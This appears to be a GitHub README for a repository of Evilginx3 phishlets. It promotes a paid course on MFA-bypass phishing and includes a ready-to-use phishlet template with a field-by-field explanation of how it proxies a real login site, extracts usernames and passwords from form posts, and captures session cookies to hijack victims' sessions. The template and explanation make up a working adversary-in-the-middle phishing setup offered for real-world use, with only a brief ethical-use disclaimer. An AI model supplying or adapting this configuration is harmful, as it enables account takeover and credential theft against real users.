# Updated Evilginx3 Phishlets
I've dedicated substantial time and effort to create and update new phishlets for Evilginx3. In this repository, you'll find many custom Evilginx phishlets, finely crafted and updated to suit real-world applications.

**Got any requests or questions?** Feel free to message me @ simplerhacking.com

# Education: Interested in Mastering Phishing Attacks with Evilginx3?
## Check out our new Evilginx3 Pro Masterclass on: www.SimplerHacking.com
## Use Code: GITHUB20 for a 20% off of the course!
### Become an Evilginx pro & learn how to bypass modern MFA with the latest version Evilginx3, send verified campaigns, capture credentials, record & analyze campaign results. Get access to Phishlets not available on our public Github as well as tons of resources to aid your engagements.

### Course Previews:

![Evilginx Pro Course Preview](https://github.com/simplerhacking/Phishlet-Creator/assets/141525149/66bbf548-b340-4c91-8694-1f77209a5edb)

![Screenshot (2279)](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/7a817e44-ce59-49f5-8197-540cead76c93)


https://github.com/simplerhacking/Evilginx3-Tutorial/assets/141525149/fa7dcbf0-13cb-4cfc-b7a8-f944d824b0c2

### Email Spoofing for MITM Bonus Preview:
![evilginx3 new course 3](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/389cadcc-4fa3-4859-89e8-0ce95af23f65)


![Evilginx Course Preview K](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/8f01d447-91f2-40ad-81f6-ac05f7e7eb5e)

![Evilginx Pro Course Workflow](https://github.com/simplerhacking/Evilginx3-Phishlets/assets/141525149/22130b95-84b2-4993-a334-245b3c7ffc78)



## Why Enroll in the Course?
- **Afforable:** The price of the course is afforable for anyone interesting in learning about Evilginx & MITM Attacks.
- **Zero Sugarcoating:**  There is no fluff in our education. You will learn everything straight up without the BS.
- **Practical Application:** Through hands-on labs & real customizeable templates, We help you apply what you learn in real-world scenarios.
- **From Basics to Advanced:** This course offers a smooth learning curve, foundation before diving into advanced features of Evilginx3.
- **Custom Phishlets files & Resource Library:** Access private phishlet files, Q&A support & our archived resource library.
- **Join our Community:** Be part of a community of learners and professionals in the field of red teaming and cybersecurity.
- **Get Support & Assistance:** Get your questions & concerns answered. We are here to help.


## Need Custom Phishlets? 
Check our constantly updating our free Evilginx3 Phishlet Repository for Red Teams

You can find it here: https://github.com/simplerhacking/Evilginx3-Phishlets

## Questions?
Send us an email to info@simplerhacking.com 

## Simpler Hacking Evilginx Phishlet Template (Use this template to make your own!)

```yaml
name: 'Your First Phishlet'
author: 'Simpler Hacking'
min_ver: '3.2.0'

proxy_hosts:
  - { phish_sub: 'www', orig_sub: 'www', domain: '{domain}', session: true, is_landing: true }

sub_filters: 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['text/html', 'application/javascript', 'text/css', 'application/json', 'image/x-icon', 'text/plain', 'application/xml', 'image/*', 'font/*']} 
  - { hostname: '{hostname}', sub: 'www', domain: '{domain}', search: '{domain}', replace: '{hostname}', mimes: ['application/x-www-form-urlencoded']}

auth_tokens:
  - domain: '{domain}'
    keys: ['session']

creds:
  - key: 'username'
    search: ['(.*)']
    type: 'post'
  - key: 'password'
    search: ['(.*)']
    type: 'post'

auth_urls:
  - url_regex: 'https://{hostname}/login'
    valid_statuses: [200]

login:
  username: user
  password: pass
  url: https://www.{domain}/login

# This is just a demo example of a phishlet for 3.2.0

# You can find phishlets here: https://github.com/simplerhacking/Evilginx3-Phishlets

```
**Explanation of Phishlet Parameters:**

- `name:` Identifies the name of the phishlet.
- `author:` Specifies the phishlet author.
- `min_ver:` Specifies the minimum Evilginx version that is compatible with your phishlet.
- `proxy_hosts:` Indicates the domain and subdomains to proxy. The `phish_sub` is the subdomain that the phishing page will imitate.
- `sub_filters:` Allows the phishlet to replace instances of the actual domain name with the phishing domain, which is critical for the phishing page to function correctly.
- `auth_tokens:` Identifies the cookies that should be captured from the victim's browser to gain access to the victim's session.
- `creds:` This field determines the credentials that the phishlet is engineered to steal. The `key` is the name of the credential (like username or password) and `search` is a regular expression that the program will use to identify and extract these details from the user's input.
- `auth_urls:` Defines the URLs that Evilginx will treat as the authenticated URLs. After the victim logs in, Evilginx will look out for a redirect to one of these URLs, at which point it will steal the listed `auth_tokens`.
- `login:` Here you specify the identifiers of the username and password fields in the login form on the original webpage. The `url` is the link of the page where the victim enters their credentials.
- `force_post:` If set to true, it forces the alteration of HTTP method from GET to POST.
- `is_landing:` If set to true, it means that the page is a landing page for the phishing attack.
- `js_inject:` This is where you can write some JavaScript to be injected in the webpage. It's typically used to enhance the phishing attack and ensure a smoother victim experience.
- `domain:` This is a template variable used to replace target hostname used in phishlet configuration.

## Disclaimer
The tools here are intended solely for legal and ethical use by cybersecurity professionals in controlled environments. 
Any illegal or malicious use is strictly prohibited.
I disclaim all responsibility for any harm, loss, or damage that may arise from improper use.
